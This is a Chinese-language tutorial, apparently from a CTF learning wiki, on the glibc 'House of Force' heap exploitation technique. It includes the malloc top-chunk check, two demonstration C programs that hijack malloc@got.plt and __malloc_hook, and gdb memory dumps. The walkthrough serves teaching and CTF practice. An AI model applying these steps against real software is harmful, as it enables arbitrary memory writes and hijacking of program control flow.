#House Of Force

## 介绍
House Of Force属于House Of XXX系列，House Of XXX指的是2004年一篇名为《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》的文章中提出的一系列针对glibc漏洞的利用方法。
但是由于年代久远《The Malloc Maleficarum》中提出的大多数利用在今天都不能奏效，我们现在所指的House Of XXX利用相比2004年文章中写的已有较大的不同。但是《The Malloc Maleficarum》依然是一篇推荐阅读的文章，你可以在这里读到它的原文：
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt

## 原理
House Of Force是一种堆溢出的利用方法，当然能够通过House Of Force进行利用的可能不只是堆溢出漏洞。如果一个堆(heap based)漏洞想要通过House Of Force方法进行利用，需要以下条件：

* 1.用户能够以溢出等方式控制到top chunk的size域
* 2.用户能够自由的控制堆分配尺寸的大小

House Of Force产生的原因在于glibc对top chunk的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时会从top chunk中分割出相应的大小作为堆块的空间，因此top chunk的位置会发生上下浮动以适应堆内存分配和释放。

HOF的利用思想可以概括为一句话：
当使用top chunk分配堆块的size值是由用户控制的任意值时会发生什么？
答案是，可以使得top chunk移动到我们想要达到的任何位置，这就相当于一次任意地址写。
<br>
然而在glibc中，会对用户请求的大小和top chunk现有的size进行验证
```
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```
然而，如果可以篡改size的大小为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制top chunk size域的漏洞。

```
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```
一般的做法是把top chunk的size改为-1，因为在进行比较时会把size转换成无符号数(如上)，因此-1会解释成为一个大数，就可以使得所有64位值都能通过验证。

```
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
##define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```
之后这里会把top指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意址(write-anything-anywhere)



## 简单示例
在学习完HOF的原理之后，我们这里通过一个示例来说明HOF的利用
这个例子的目标是通过HOF来篡改malloc@got.plt实现劫持程序流程

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

首先，我们分配一个0x10字节大小的块

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
0x602030:	0x0000000000000000	0x0000000000000000
```
之后把top chunk的size改为0xffffffffffffffff，在题目中这一步可以通过堆溢出等漏洞来实现。
因为-1在补码中是以0xffffffffffffffff表示的，所以我们直接赋值-1就可以。

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff <=== top chunk size域被更改
0x602030:	0x0000000000000000	0x0000000000000000
```
注意此时的top chunk位置，当我们进行下一次分配的时候就会更改top chunk的位置到我们想要的地方

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 <=== top chunk此时一切正常
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
接下来我们执行`malloc(-4120);`，-4120是怎么得出的呢？
首先明确要写入的目的地址，这里我编译的情况0x601020是malloc@got.plt的地址

```
0x601020:	0x00007ffff7a91130 <=== malloc@got.plt
```
之后明确当前top chunk的地址，根据前面描述，top chunk位于0x602020
所以我们使用0x601020-0x602020-0x10=-4120,之所以要减去0x10是为了刨除chunk header的偏移
当调用`malloc(-4120)`之后，我们可以观察到top chunk被抬高到我们想要的位置

```
0x7ffff7dd1b20 <main_arena>:\	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000601010 <=== 可以观察到top chunk被抬高
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
之后，我们分配的块就会出现在0x601010+0x10的位置，也就是0x601020可以更改got表中的内容了。

## 简单示例2
在上一个示例中我们演示了通过HOF使得top chunk的指针减小来修改位于其上面(低地址)的got表中的内容，
但是HOF其实也可以使得top chunk指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```
我们可以看到程序代码与简单示例1基本相同，除了第二次malloc的size有所不同。
这次我们的目标是malloc_hook，我们知道malloc_hook是位于libc.so里的全局变量值，首先查看内存布局

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```
可以看到heap的基址在0x602000，而libc的基址在0x7ffff7a0d000，因此我们需要通过HOF扩大top chunk指针的值来实现对malloc_hook的写。
<br>
首先由调试得知__malloc_hook的地址位于0x7ffff7dd1b10，采取计算0x7ffff7dd1b00-0x602020-0x10=140737345551056
经过这次malloc之后，我们可以观察到top chunk的地址被抬高到了0x00007ffff7dd1b00

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
之后，我们只要再次分配就可以控制0x7ffff7dd1b10处的__malloc_hook值了

```
rax = 0x00007ffff7dd1b10
    
0x400562 <main+60>        mov    edi, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>
```

## 小总结
在这一节中讲解了House Of Force的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实HOF的利用要求还是相当苛刻的。

* 首先，需要存在漏洞使得用户能够控制top chunk的size域。
* 其次，需要用户能自由控制malloc的分配大小
* 第三，分配的次数不能受限制

其实这三点中第二点往往是最难办的，CTF题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过HOF的方法进行利用。



